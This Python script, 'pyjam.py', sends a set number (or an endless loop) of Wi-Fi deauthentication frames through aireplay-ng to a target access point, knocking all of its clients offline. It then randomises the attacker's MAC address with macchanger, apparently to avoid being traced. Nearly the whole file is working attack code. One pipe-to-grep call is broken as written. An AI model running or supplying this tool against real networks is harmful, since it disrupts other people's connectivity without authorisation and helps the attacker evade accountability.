#!/usr/bin/env python3
'''
    ------------------------------------------------------------------------------------------------
    A script for sending a specific number of deauthentication requests to all devices on a network, and then changing your MAC address.
    ------------------------------------------------------------------------------------------------
    You must have aircrack-ng and macchanger installed to run this script.
    This script takes a MAC address, a NUMBER and your wireless card name as arguments when run from the command line. So to run it from a linux/mac terminal:

    python3 pyjam.py -t MACADDRESS -n NUMBER -w YOURWIRELESSCARDNAME
    Real world use would look like:
    python3 pyjam.py -t AA:BB:CC:DD:EE:FF -n 100 -w wlan0

    Notes to self and other interested parties:
        a. Added feature so user can input their specific wireless card.
        a. Before running this script:
            1. Set wireless card to monitor mode or run 'monitor' bash script.
            2. Run 'airmon-ng check YOURWIRELESSCARDNAME' and kill all processes shown by above command or run pykill.py

    by: corfucius
'''

import subprocess
import optparse

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Enter MAC address to deauthenticate")
    parser.add_option("-n", "--number", dest="number", help="Enter integer for number of times to deauthenticate your target")
    parser.add_option("-w", "--wireless", dest="wireless", help="Enter the name of your wireless card, ex: wlan0, wlp0s, etc.. Use -w or --wireless")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an MAC address to deauthenticate")
    elif not options.number:
        parser.error("[-] Please enter a number for how many times you would like to hit the target, enter 0 for a loop")
    elif not options.wireless:
        parser.error("[-] Please enter the name of your wireless card, An example: -w wlan0, or --wireless wlp0s")
    return options

def deauthenticate(target, num, wireless):
    print("[+] Deauthenticating " + target + " " + num + " times")
    subprocess.call(["sudo", "aireplay-ng", "-0", num, "-a", target, wireless])
    print("[+] Wireless card going down")
    subprocess.call(["sudo", "ifconfig", wireless, "down"])
    print("Getting new MAC address for your wireless card......")
    subprocess.call(["sudo", "macchanger", "-r", wireless, "|", "grep", "'New MAC'"])
    subprocess.call(["sudo", "iwconfig", wireless, "mode", "monitor"])
    subprocess.call(["sudo", "ifconfig", wireless, "up"])
    print("[+] Monitor is back up with new MAC address and in monitor mode")
    #subprocess.check_output(["iwconfig", "wlp0s26f7u1u3", "|", "grep", "Mode"],  shell=True)

options = get_args()
deauthenticate(options.target, options.number, options.wireless)
